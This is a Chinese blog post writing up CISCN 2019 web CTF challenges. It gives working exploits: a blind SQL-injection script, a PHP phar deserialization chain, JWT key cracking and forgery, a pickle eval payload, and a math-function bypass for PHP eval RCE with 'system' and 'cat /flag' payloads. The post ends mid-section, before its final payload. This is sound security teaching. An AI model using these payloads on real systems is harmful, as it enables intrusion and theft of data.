<!DOCTYPE html>
<html lang="">
  <head hexo-theme='https://github.com/volantis-x/hexo-theme-volantis/tree/'>
  <meta charset="utf-8">
  <!-- SEO相关 -->
  
    
  
  <!-- 渲染优化 -->
  <meta http-equiv='x-dns-prefetch-control' content='on' />
  <link rel='dns-prefetch' href='https://cdn.jsdelivr.net'>
  <link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin>
  <meta name="renderer" content="webkit">
  <meta name="force-rendering" content="webkit">
  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
  <meta name="HandheldFriendly" content="True" >
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  
  <link rel="preload" href="/css/first.css" as="style">
  

  <!-- 页面元数据 -->
  
  <title>CISCN-2019-web部分复现 - byc_404&#39;s blog</title>
  
    <meta name="keywords" content="WEB,CTF">
  

  
    <meta name="description" content="原来国赛就是CISCN……buuoj上题目挺全的，干脆选一些比较有价值的题目复现下：
Hack World(盲注)简单的布尔盲注题，简单FUZZ一下发现是数值型注入。同时过滤了and，or，union空格等等。回显可以判断正误，考虑是布尔盲注。payload直接用if分流即可。空格可以%0a绕过，也可以直接括号括...">
  

  <!-- feed -->
  
    <link rel="alternate" href="/atom.xml" title="byc_404's blog">
  

  <!-- import meta -->
  

  <!-- link -->
  
    <link rel="shortcut icon" type='image/x-icon' href="/assests/favicon.ico">
  

  <!-- import link -->
  

  
    
<link rel="stylesheet" href="/css/first.css">

  

  
  <link rel="stylesheet" href="/css/style.css" media="print" onload="this.media='all';this.onload=null">
  <noscript><link rel="stylesheet" href="/css/style.css"></noscript>
  

  <script id="loadcss"></script>

  
<script>
if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMode))
    document.write(
	'<style>'+
		'html{'+
			'overflow-x: hidden !important;'+
			'overflow-y: hidden !important;'+
		'}'+
		'.kill-ie{'+
			'text-align:center;'+
			'height: 100%;'+
			'margin-top: 15%;'+
			'margin-bottom: 5500%;'+
		'}'+
	'</style>'+
    '<div class="kill-ie">'+
        '<h1><b>抱歉，您的浏览器无法访问本站</b></h1>'+
        '<h3>微软已经于2016年终止了对 Internet Explorer (IE) 10 及更早版本的支持，<br/>'+
        '继续使用存在极大的安全隐患，请使用当代主流的浏览器进行访问。</h3><br/>'+
        '<a href="https://www.microsoft.com/zh-cn/WindowsForBusiness/End-of-IE-support" target="_blank" rel="noopener"><strong>了解详情 ></strong></a>'+
    '</div>');
</script>


<noscript>
	<style>
		html{
			overflow-x: hidden !important;
			overflow-y: hidden !important;
		}
		.kill-noscript{
			text-align:center;
			height: 100%;
			margin-top: 15%;
			margin-bottom: 5500%;
		}
	</style>
    <div class="kill-noscript">
        <h1><b>抱歉，您的浏览器无法访问本站</b></h1>
        <h3>本页面需要浏览器支持（启用）JavaScript</h3><br/>
        <a href="https://www.baidu.com/s?wd=启用JavaScript" target="_blank" rel="noopener"><strong>了解详情 ></strong></a>
    </div>
</noscript>

</head>

  <body>
    

<header id="l_header" class="l_header auto shadow blur " style='opacity: 0' >
  <div class='container'>
  <div id='wrapper'>
    <div class='nav-sub'>
      <p class="title"></p>
      <ul class='switcher nav-list-h m-phone' id="pjax-header-nav-list">
        <li><a id="s-comment" class="fas fa-comments fa-fw" target="_self" href='javascript:void(0)'></a></li>
        
          <li><a id="s-toc" class="s-toc fas fa-list fa-fw" target="_self" href='javascript:void(0)'></a></li>
        
      </ul>
    </div>
		<div class="nav-main">
      
        
        <a class="title flat-box" target="_self" href='/'>
          
          
          
        </a>
      

			<div class='menu navigation'>
				<ul class='nav-list-h m-pc'>
          
          
          
            
            
              <li>
                <a class="menuitem flat-box faa-parent animated-hover" href=/
                  
                  
                  
                    id="home"
                  >
                  <i class='fas fa-rss fa-fw'></i>博客
                </a>
                
              </li>
            
          
          
            
            
              <li>
                <a class="menuitem flat-box faa-parent animated-hover" href=/tags/
                  
                  
                  
                    id="tags"
                  >
                  <i class='fas fa-tags fa-fw'></i>标签
                </a>
                
              </li>
            
          
          
            
            
              <li>
                <a class="menuitem flat-box faa-parent animated-hover" href=/archives/
                  
                  
                  
                    id="archives"
                  >
                  <i class='fas fa-archive fa-fw'></i>归档
                </a>
                
              </li>
            
          
          
            
            
              <li>
                <a class="menuitem flat-box faa-parent animated-hover" href=/friends/
                  
                  
                  
                    id="friends"
                  >
                  <i class='fas fa-link fa-fw'></i>友链
                </a>
                
              </li>
            
          
          
            
            
              <li>
                <a class="menuitem flat-box faa-parent animated-hover" href=/about/
                  
                  
                  
                    id="about"
                  >
                  <i class='fas fa-info-circle fa-fw'></i>关于
                </a>
                
              </li>
            
          
          
				</ul>
			</div>

      <div class="m_search">
        <form name="searchform" class="form u-search-form">
          <i class="icon fas fa-search fa-fw"></i>
          <input type="text" class="input u-search-input" placeholder="搜索" />
        </form>
      </div>

			<ul class='switcher nav-list-h m-phone'>
				
					<li><a class="s-search fas fa-search fa-fw" target="_self" href='javascript:void(0)'></a></li>
				
				<li>
          <a class="s-menu fas fa-bars fa-fw" target="_self" href='javascript:void(0)'></a>
          <ul class="menu-phone list-v navigation white-box">
            
              
            
              <li>
                <a class="menuitem flat-box faa-parent animated-hover" href=/
                  
                  
                  
                    id="home"
                  >
                  <i class='fas fa-rss fa-fw'></i>博客
                </a>
                
              </li>
            
          
            
              
            
              <li>
                <a class="menuitem flat-box faa-parent animated-hover" href=/tags/
                  
                  
                  
                    id="tags"
                  >
                  <i class='fas fa-tags fa-fw'></i>标签
                </a>
                
              </li>
            
          
            
              
            
              <li>
                <a class="menuitem flat-box faa-parent animated-hover" href=/archives/
                  
                  
                  
                    id="archives"
                  >
                  <i class='fas fa-archive fa-fw'></i>归档
                </a>
                
              </li>
            
          
            
              
            
              <li>
                <a class="menuitem flat-box faa-parent animated-hover" href=/friends/
                  
                  
                  
                    id="friends"
                  >
                  <i class='fas fa-link fa-fw'></i>友链
                </a>
                
              </li>
            
          
            
              
            
              <li>
                <a class="menuitem flat-box faa-parent animated-hover" href=/about/
                  
                  
                  
                    id="about"
                  >
                  <i class='fas fa-info-circle fa-fw'></i>关于
                </a>
                
              </li>
            
          
            
          </ul>
        </li>
			</ul>
		</div>
	</div>
  </div>
</header>

    <div id="l_body">
      <div id="l_cover">
  
    
        <div id="half" class='cover-wrapper post dock' style="display: ;">
          
            <div id='cover-backstretch'></div>
          
          <div class='cover-body'>
  <div class='top'>
    
    
      <p class="title">byc_404's blog</p>
    
    
      <p class="subtitle">Do not go gentle into that good night</p>
    
  </div>
  <div class='bottom'>
    <div class='menu navigation'>
      <div class='list-h'>
        
          
            <a href="/"
              
              
              id="home">
              <i class='fas fa-rss fa-fw'></i><p>博客</p>
            </a>
          
            <a href="/tags/"
              
              
              id="tags">
              <i class='fas fa-tags fa-fw'></i><p>标签</p>
            </a>
          
            <a href="/archives/"
              
              
              id="archives">
              <i class='fas fa-archive fa-fw'></i><p>归档</p>
            </a>
          
            <a href="/friends/"
              
              
              id="friends">
              <i class='fas fa-link fa-fw'></i><p>友链</p>
            </a>
          
            <a href="/about/"
              
              
              id="about">
              <i class='fas fa-info-circle fa-fw'></i><p>关于</p>
            </a>
          
        
      </div>
    </div>
  </div>
</div>

          <div id="scroll-down" style="display: none;"><i class="fa fa-chevron-down scroll-down-effects"></i></div>
        </div>
    
  
  </div>

      <div id="safearea">
        <div class="body-wrapper" id="pjax-container">
          

<div class='l_main'>
  <article class="article post white-box reveal md shadow article-type-post" id="post" itemscope itemprop="blogPost">
  


  
  <div class="article-meta" id="top">
    
    
    
      <h1 class="title">
        CISCN-2019-web部分复现
      </h1>
      <div class='new-meta-box'>
        
          
            
<div class='new-meta-item author'>
  <a class='author' href="https://www.bycsec.top" rel="nofollow">
    <img no-lazy src="/assests/favicon.ico">
    <p>byc_404</p>
  </a>
</div>

          
        
          
            

          
        
          
            <div class="new-meta-item date">
  <a class='notlink'>
    <i class="fas fa-calendar-alt fa-fw" aria-hidden="true"></i>
    <p>发布于：Feb 19, 2020</p>
  </a>
</div>

          
        
          
            
  <div class="new-meta-item browse leancloud">
    <a class='notlink'>
      
      <div id="lc-pv" data-title="CISCN-2019-web部分复现" data-path="/2020/02/19/CISCN-2019-web%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/">
        <i class="fas fa-eye fa-fw" aria-hidden="true"></i>
        <span id='number'><i class="fas fa-circle-notch fa-spin fa-fw" aria-hidden="true"></i></span>
        次浏览
      </div>
    </a>
  </div>


          
        
      </div>
    
  </div>


  
  
  <p>原来国赛就是CISCN……buuoj上题目挺全的，干脆选一些比较有价值的题目复现下：</p>
<h1 id="Hack-World-盲注"><a href="#Hack-World-盲注" class="headerlink" title="Hack World(盲注)"></a>Hack World(盲注)</h1><p>简单的布尔盲注题，简单FUZZ一下发现是数值型注入。同时过滤了<code>and，or，union</code>空格等等。回显可以判断正误，考虑是布尔盲注。payload直接用if分流即可。空格可以<code>%0a</code>绕过，也可以直接括号括起来(之前总结过)</p>
<a id="more"></a>

<p>exp：</p>
<pre><code class="python">import requests

#flag{3de016a6-fb79-4b56-a2fb-ea24bc26083f}
url=&#39;http://18733385-8c1b-4df7-88f0-1fb70bb6c05b.node3.buuoj.cn/index.php&#39;
flag=&#39;&#39;
for i in range(1,50):
    print(i)
    a=0
    for j in range(32,128):
        payload=&quot;if(ascii(substr((select%0aflag%0afrom%0aflag),&quot;+str(i)+&quot;,1))=&quot;+str(j)+&quot;,1,2)&quot;
        data = {
            &#39;id&#39;: payload
        }
        res=requests.post(url,data=data)
        if &#39;Hello&#39; in res.text:
            flag+=chr(j)
            print(flag)
            a=1
            break
    if a==0:
        break</code></pre>
<h1 id="Dropbox-phar反序列化"><a href="#Dropbox-phar反序列化" class="headerlink" title="Dropbox(phar反序列化)"></a>Dropbox(phar反序列化)</h1><p>题目属于php反序列化。感觉国赛的题目确实质量很高，这里的反序列化利用看了源码不少时间才找出利用。赶紧记录下。<br>首先进来注册账号登陆。发现有文件上传点。顺手传个一句话图片马，发现没有过滤。然后提供了对图片的下载与删除功能。此时依次尝试一下，发现下载功能的<code>filename</code>允许任意文件下载，于是直接拿到index.php的源码，接着可以拿到其他关键源码，发现是php反序列化，开始审计。<br>index.php</p>
<pre><code class="php">&lt;?php
session_start();
if (!isset($_SESSION[&#39;login&#39;])) {
    header(&quot;Location: login.php&quot;);
    die();
}
?&gt;
&lt;?php echo $_SESSION[&#39;username&#39;]?&gt;

&lt;?php
include &quot;class.php&quot;;
$a = new FileList($_SESSION[&#39;sandbox&#39;]);
$a-&gt;Name();
$a-&gt;Size();
?&gt;</code></pre>
<p>class.php</p>
<pre><code class="php">&lt;?php
error_reporting(0);
$dbaddr = &quot;127.0.0.1&quot;;
$dbuser = &quot;root&quot;;
$dbpass = &quot;root&quot;;
$dbname = &quot;dropbox&quot;;
$db = new mysqli($dbaddr, $dbuser, $dbpass, $dbname);

class User {
    public $db;

    public function __construct() {
        global $db;
        $this-&gt;db = $db;
    }

    public function user_exist($username) {
        $stmt = $this-&gt;db-&gt;prepare(&quot;SELECT `username` FROM `users` WHERE `username` = ? LIMIT 1;&quot;);
        $stmt-&gt;bind_param(&quot;s&quot;, $username);
        $stmt-&gt;execute();
        $stmt-&gt;store_result();
        $count = $stmt-&gt;num_rows;
        if ($count === 0) {
            return false;
        }
        return true;
    }

    public function add_user($username, $password) {
        if ($this-&gt;user_exist($username)) {
            return false;
        }
        $password = sha1($password . &quot;SiAchGHmFx&quot;);
        $stmt = $this-&gt;db-&gt;prepare(&quot;INSERT INTO `users` (`id`, `username`, `password`) VALUES (NULL, ?, ?);&quot;);
        $stmt-&gt;bind_param(&quot;ss&quot;, $username, $password);
        $stmt-&gt;execute();
        return true;
    }

    public function verify_user($username, $password) {
        if (!$this-&gt;user_exist($username)) {
            return false;
        }
        $password = sha1($password . &quot;SiAchGHmFx&quot;);
        $stmt = $this-&gt;db-&gt;prepare(&quot;SELECT `password` FROM `users` WHERE `username` = ?;&quot;);
        $stmt-&gt;bind_param(&quot;s&quot;, $username);
        $stmt-&gt;execute();
        $stmt-&gt;bind_result($expect);
        $stmt-&gt;fetch();
        if (isset($expect) &amp;&amp; $expect === $password) {
            return true;
        }
        return false;
    }

    public function __destruct() {
        $this-&gt;db-&gt;close();
    }
}

class FileList {
    private $files;
    private $results;
    private $funcs;

    public function __construct($path) {
        $this-&gt;files = array();
        $this-&gt;results = array();
        $this-&gt;funcs = array();
        $filenames = scandir($path);

        $key = array_search(&quot;.&quot;, $filenames);
        unset($filenames[$key]);
        $key = array_search(&quot;..&quot;, $filenames);
        unset($filenames[$key]);

        foreach ($filenames as $filename) {
            $file = new File();
            $file-&gt;open($path . $filename);
            array_push($this-&gt;files, $file);
            $this-&gt;results[$file-&gt;name()] = array();
        }
    }

    public function __call($func, $args) {
        array_push($this-&gt;funcs, $func);
        foreach ($this-&gt;files as $file) {
            $this-&gt;results[$file-&gt;name()][$func] = $file-&gt;$func();
        }
    }

    public function __destruct() {
        $table = &#39;&lt;div id=&quot;container&quot; class=&quot;container&quot;&gt;&lt;div class=&quot;table-responsive&quot;&gt;&lt;table id=&quot;table&quot; class=&quot;table table-bordered table-hover sm-font&quot;&gt;&#39;;
        $table .= &#39;&lt;thead&gt;&lt;tr&gt;&#39;;
        foreach ($this-&gt;funcs as $func) {
            $table .= &#39;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;&#39; . htmlentities($func) . &#39;&lt;/th&gt;&#39;;
        }
        $table .= &#39;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;Opt&lt;/th&gt;&#39;;
        $table .= &#39;&lt;/thead&gt;&lt;tbody&gt;&#39;;
        foreach ($this-&gt;results as $filename =&gt; $result) {
            $table .= &#39;&lt;tr&gt;&#39;;
            foreach ($result as $func =&gt; $value) {
                $table .= &#39;&lt;td class=&quot;text-center&quot;&gt;&#39; . htmlentities($value) . &#39;&lt;/td&gt;&#39;;
            }
            $table .= &#39;&lt;td class=&quot;text-center&quot; filename=&quot;&#39; . htmlentities($filename) . &#39;&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;download&quot;&gt;ä¸è½½&lt;/a&gt; / &lt;a href=&quot;#&quot; class=&quot;delete&quot;&gt;å é¤&lt;/a&gt;&lt;/td&gt;&#39;;
            $table .= &#39;&lt;/tr&gt;&#39;;
        }
        echo $table;
    }
}

class File {
    public $filename;

    public function open($filename) {
        $this-&gt;filename = $filename;
        if (file_exists($filename) &amp;&amp; !is_dir($filename)) {
            return true;
        } else {
            return false;
        }
    }

    public function name() {
        return basename($this-&gt;filename);
    }

    public function size() {
        $size = filesize($this-&gt;filename);
        $units = array(&#39; B&#39;, &#39; KB&#39;, &#39; MB&#39;, &#39; GB&#39;, &#39; TB&#39;);
        for ($i = 0; $size &gt;= 1024 &amp;&amp; $i &lt; 4; $i++) $size /= 1024;
        return round($size, 2).$units[$i];
    }

    public function detele() {
        unlink($this-&gt;filename);
    }

    public function close() {
        return file_get_contents($this-&gt;filename);
    }
}
?&gt;</code></pre>
<p>download.php</p>
<pre><code class="php">&lt;?php
session_start();
if (!isset($_SESSION[&#39;login&#39;])) {
    header(&quot;Location: login.php&quot;);
    die();
}

if (!isset($_POST[&#39;filename&#39;])) {
    die();
}

include &quot;class.php&quot;;
ini_set(&quot;open_basedir&quot;, getcwd() . &quot;:/etc:/tmp&quot;);

chdir($_SESSION[&#39;sandbox&#39;]);
$file = new File();
$filename = (string) $_POST[&#39;filename&#39;];
if (strlen($filename) &lt; 40 &amp;&amp; $file-&gt;open($filename) &amp;&amp; stristr($filename, &quot;flag&quot;) === false) {
    Header(&quot;Content-type: application/octet-stream&quot;);
    Header(&quot;Content-Disposition: attachment; filename=&quot; . basename($filename));
    echo $file-&gt;close();
} else {
    echo &quot;File not exist&quot;;
}
?&gt;</code></pre>
<p>delete.php</p>
<pre><code class="php">&lt;?php
session_start();
if (!isset($_SESSION[&#39;login&#39;])) {
    header(&quot;Location: login.php&quot;);
    die();
}

if (!isset($_POST[&#39;filename&#39;])) {
    die();
}

include &quot;class.php&quot;;

chdir($_SESSION[&#39;sandbox&#39;]);
$file = new File();
$filename = (string) $_POST[&#39;filename&#39;];
if (strlen($filename) &lt; 40 &amp;&amp; $file-&gt;open($filename)) {
    $file-&gt;detele();
    Header(&quot;Content-type: application/json&quot;);
    $response = array(&quot;success&quot; =&gt; true, &quot;error&quot; =&gt; &quot;&quot;);
    echo json_encode($response);
} else {
    Header(&quot;Content-type: application/json&quot;);
    $response = array(&quot;success&quot; =&gt; false, &quot;error&quot; =&gt; &quot;File not exist&quot;);
    echo json_encode($response);
}
?&gt;</code></pre>
<p>审计源码第一反应首先是sql注入。但是随即发现不存在可控参数，所以注入无果。接下来重心放在反序列化上。首先需要明确的是，我们源码中并不存在<code>unserialize()</code>函数，但是我们有文件上传点。所以反序列化需要通过上传phar文件并进行<code>phar://</code>伪协议触发。</p>
<p>接下来寻找常见文件读取函数，注意到File类<code>file_get_contents()</code>方法</p>
<pre><code class="php">public function close() {
    return file_get_contents($this-&gt;filename);
}</code></pre>
<p>确定是可以进行文件读取了。接下来挖掘一下函数的调用。首先<code>close()</code>是File类的方法，而File类只在Filelist类中有调用过。但Filelist中并没有调用<code>close()</code>方法的位置。此时需要注意Filelist类中的两个魔术方法之一：</p>
<pre><code class="php">public function __call($func, $args) {
        array_push($this-&gt;funcs, $func);
        foreach ($this-&gt;files as $file) {
            $this-&gt;results[$file-&gt;name()][$func] = $file-&gt;$func();
        }
    }</code></pre>
<p>它将Filelist类中的files数组全部遍历了一遍，并执行对应的<code>func()</code>结果被存进result。之后的<code>__destruct()</code>方法则会将result等等结果打印出来。<br>这一条利用在于：确保了Filelist的对象如果能借此魔术方法调用<code>close()</code>方法，那么它最后销毁时析构函数会打印出我们需要的文件内容。<br>之后再次审计，注意到User类的<code>__destruct()</code>方法</p>
<pre><code class="php">public function __destruct() {
        $this-&gt;db-&gt;close();
    }</code></pre>
<p>原本只是一个同名<code>close()</code>函数，但是此处却存在着可利用之处。假如我们的文件上传的是User类的对象。销毁时自然会执行<code>close()</code>函数。但如果把<code>db</code>设置为Filelist类的对象，那么<code>db-&gt;close()</code>执行时将找不到<code>close()</code>函数，进而执行其<code>files</code>数组里的每一个函数。那么如果<code>files</code>数组里是存在同名函数<code>close</code>的File类对象，就能成功执行文件读取。<br>找到利用链后，exp如下：</p>
<pre><code class="php">&lt;?php
class User {
    public $db;
}

class File {
    public $filename;
}
class FileList {
    private $files;
    private $results;
    private $funcs;

    public function __construct() {
        $file = new File();
        $file-&gt;filename = &#39;/flag.txt&#39;;
        $this-&gt;files = array($file);
        $this-&gt;results = array();
        $this-&gt;funcs = array();
    }
}


@unlink(&quot;phar.phar&quot;);
$phar = new Phar(&quot;a.phar&quot;); 
$phar-&gt;startBuffering();
$phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); 
$o = new User();
$o-&gt;db = new FileList();
$phar-&gt;setMetadata($o);
$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;);
$phar-&gt;stopBuffering();</code></pre>
<p>生成的a.phar修改后缀上传，之后需要找触发方式，此处需要注意一点，在download.php中，设置了目录：</p>
<pre><code class="php">ini_set(&quot;open_basedir&quot;, getcwd() . &quot;:/etc:/tmp&quot;);</code></pre>
<p>而只有delete.php中的目录是在题目给定的文件上传沙盒中的：</p>
<pre><code class="php">chdir($_SESSION[&#39;sandbox&#39;]);</code></pre>
<p>故只有delete操作能直接<code>phar://</code>触发反序列化。<br><img src="/2020/02/19/CISCN-2019-web%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/flag1.PNG" class="lazyload" data-srcset="flag1.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="flag"></p>
<p>(这里的文件读取flag.txt是传统艺能？每次题目都没交代）</p>
<h1 id="ikun-python反序列化"><a href="#ikun-python反序列化" class="headerlink" title="ikun(python反序列化)"></a>ikun(python反序列化)</h1><p>结合了很多知识点的一道题目，但是最后一步的python反序列化确实不会，只好去找了找wp。(本来之前打算学下python反序列化的，结果搞忘了hhh) </p>
<p>首先登陆题目发现在迫害cxk，同时底下有许多商品提示需要购买lv6的商品。但是看了半天前几页并没找到lv6商品，由于页数page直接get传值，看来需要脚本爆破一下：</p>
<pre><code class="python">import requests
url=&#39;http://2c771d3e-86f0-4f72-9815-f19dcb4fd51a.node3.buuoj.cn/shop?page=&#39;

for i in range(0,2000):
    r=requests.get(url+str(i))
    if &#39;lv6.png&#39; in r.text:
        print (i)
        break</code></pre>
<p>之后发现lv6商品，加入到购物车后，准备注册账号并登录购买。显然钱数是不够的，但是却有折扣这一参数被直接post传值。那么修改其值足够小即可。得到一个目录<code>b1g_m4mber</code>。应该是后台地址。<br>访问网址提示需要admin操作权限。这里抓包一下，发现cookie里居然有JWT。看来是比较常见的JWT伪造认证了。<br>(之前在hackthebox某一台靶机中就存在仿造JWT登录的操作，应该说并不难，而且比较好理解)<br>先拿来base64解码，发现存在乱码。可能是因为加了盐值key的原因。那么第一步先爆破下key值：<br><a href="https://github.com/brendan-rius/c-jwt-cracker" target="_blank" rel="noopener">https://github.com/brendan-rius/c-jwt-cracker</a><br><img src="/2020/02/19/CISCN-2019-web%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/1.PNG" class="lazyload" data-srcset="1.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="1.PNG"><br>得到JWTKey 为1Kun,接下来上<a href="https://jwt.io/" target="_blank" rel="noopener">https://jwt.io/</a><br>去生成admin的jwt token.<br><img src="/2020/02/19/CISCN-2019-web%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/2.PNG" class="lazyload" data-srcset="2.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="jwt伪造"><br>可以看到jwt-token一定是xxx.yyy.zzz的形式。且三段各自代表header,paylaod，signature的json数据内容经base64处理。爆破key值修改paylload为admin也是家常便饭。<br>控制台里修改</p>
<pre><code>document.cookie=&quot;JWT=xxxxxxxxxxx&quot;</code></pre><p>成功登陆。</p>
<p>之后发现源码存在<a href="http://www.zip。可以拿到源码。然后我就不会了" target="_blank" rel="noopener">www.zip。可以拿到源码。然后我就不会了</a>…….<br>查wp后发现是python反序列化。具体漏洞在Admin.py：</p>
<pre><code class="python">import tornado.web
from sshop.base import BaseHandler
import pickle
import urllib


class AdminHandler(BaseHandler):
    @tornado.web.authenticated
    def get(self, *args, **kwargs):
        if self.current_user == &quot;admin&quot;:
            return self.render(&#39;form.html&#39;, res=&#39;This is Black Technology!&#39;, member=0)
        else:
            return self.render(&#39;no_ass.html&#39;)

    @tornado.web.authenticated
    def post(self, *args, **kwargs):
        try:
            become = self.get_argument(&#39;become&#39;)
            p = pickle.loads(urllib.unquote(become))
            return self.render(&#39;form.html&#39;, res=p, member=1)
        except:
            return self.render(&#39;form.html&#39;, res=&#39;This is Black Technology!&#39;, member=0)</code></pre>
<p>become可控。<br>这里其实可以把<code>pickle.loads</code>的操作理解为反序列化。而<code>__reduce__</code>这一魔术方法会在对象被pickle时调用。从而可以构造payload:</p>
<pre><code class="python">import pickle
import urllib
class payload(object):
    def __reduce__(self):
       return (eval, (&quot;open(&#39;/flag.txt&#39;,&#39;r&#39;).read()&quot;,))

a = pickle.dumps(payload())
a= urllib.quote(a)
print(a)</code></pre>
<p>这里我的exp在本机跑出来结果不知为何是错的。只有用kali才跑出正确的结果<br><img src="/2020/02/19/CISCN-2019-web%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/3.PNG" class="lazyload" data-srcset="3.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="exp"><br>传值拿flag<br><img src="/2020/02/19/CISCN-2019-web%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/flag2.PNG" class="lazyload" data-srcset="flag2.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="flag"></p>
<h1 id="Love-Math-构造RCE"><a href="#Love-Math-构造RCE" class="headerlink" title="Love Math(构造RCE)"></a>Love Math(构造RCE)</h1><p>源码：</p>
<pre><code class="php">&lt;?php
error_reporting(0);
//听说你很喜欢数学，不知道你是否爱它胜过爱flag
if(!isset($_GET[&#39;c&#39;])){
    show_source(__FILE__);
}else{
    //例子 c=20-1
    $content = $_GET[&#39;c&#39;];
    if (strlen($content) &gt;= 80) {
        die(&quot;太长了不会算&quot;);
    }
    $blacklist = [&#39; &#39;, &#39;\t&#39;, &#39;\r&#39;, &#39;\n&#39;,&#39;\&#39;&#39;, &#39;&quot;&#39;, &#39;`&#39;, &#39;\[&#39;, &#39;\]&#39;];
    foreach ($blacklist as $blackitem) {
        if (preg_match(&#39;/&#39; . $blackitem . &#39;/m&#39;, $content)) {
            die(&quot;请不要输入奇奇怪怪的字符&quot;);
        }
    }
    //常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp
    $whitelist = [&#39;abs&#39;, &#39;acos&#39;, &#39;acosh&#39;, &#39;asin&#39;, &#39;asinh&#39;, &#39;atan2&#39;, &#39;atan&#39;, &#39;atanh&#39;, &#39;base_convert&#39;, &#39;bindec&#39;, &#39;ceil&#39;, &#39;cos&#39;, &#39;cosh&#39;, &#39;decbin&#39;, &#39;dechex&#39;, &#39;decoct&#39;, &#39;deg2rad&#39;, &#39;exp&#39;, &#39;expm1&#39;, &#39;floor&#39;, &#39;fmod&#39;, &#39;getrandmax&#39;, &#39;hexdec&#39;, &#39;hypot&#39;, &#39;is_finite&#39;, &#39;is_infinite&#39;, &#39;is_nan&#39;, &#39;lcg_value&#39;, &#39;log10&#39;, &#39;log1p&#39;, &#39;log&#39;, &#39;max&#39;, &#39;min&#39;, &#39;mt_getrandmax&#39;, &#39;mt_rand&#39;, &#39;mt_srand&#39;, &#39;octdec&#39;, &#39;pi&#39;, &#39;pow&#39;, &#39;rad2deg&#39;, &#39;rand&#39;, &#39;round&#39;, &#39;sin&#39;, &#39;sinh&#39;, &#39;sqrt&#39;, &#39;srand&#39;, &#39;tan&#39;, &#39;tanh&#39;];
    preg_match_all(&#39;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#39;, $content, $used_funcs);  
    foreach ($used_funcs[0] as $func) {
        if (!in_array($func, $whitelist)) {
            die(&quot;请不要输入奇奇怪怪的函数&quot;);
        }
    }
    //帮你算出答案
    eval(&#39;echo &#39;.$content.&#39;;&#39;);
}</code></pre>
<p>题目很有意思，达成目的显然是RCE。但是可以发现过滤了很多字符与函数，限制了长度。而白名单内的函数全部是数学函数，黑名单的字符过滤了常见标点。现在要达成RCE需要绕过上的奇淫技巧。</p>
<p>首先有一种思路是分开传值 ，我个人也比较偏好这种做法。具体形式大致是</p>
<pre><code>?c=$_GET[a]&amp;a=system(&#39;ls&#39;);</code></pre><p>但是此题首先变量名不能随意，只能从白名单中找出可用数学符号作为变量名。此处考虑长度使用pi。<br>然后是考虑，在<code>_GET[]</code>被过滤的情况下能使用什么数学函数达成构造字符串的目的。这里应该首先考虑进制转换函数，因为10进制以上的数都有英文字母作为数码。而假如是36进制数的话，将会拥有1~10加上26个英文字母作为数码，这足以我们拼凑出payload。<br>假如payload是：</p>
<pre><code>?c=($_GET){0}($_GET){1};&amp;0=system&amp;1=cat /flag</code></pre><p>那么我们只需构造出<code>_GET</code>字符串。<br>具体倒推方法如下：</p>
<pre><code>_GET-&gt;bin2hex(&#39;_GET&#39;)-&gt;5f474554
-&gt;hexdec(&#39;5f474554&#39;)-&gt;1598506324#纯数字
#需要构造hex2bin()
base_convert(&#39;hex2bin&#39;,36,10)-&gt;37907361743</code></pre><p>所以</p>
<pre><code>$pi=base_convert(37907361743,10,36)(dechex(1598506324));
$pi=hex2bin(5f474554);
$pi=_GET;
$$pi=$_GET;</code></pre><p>故最后payload</p>
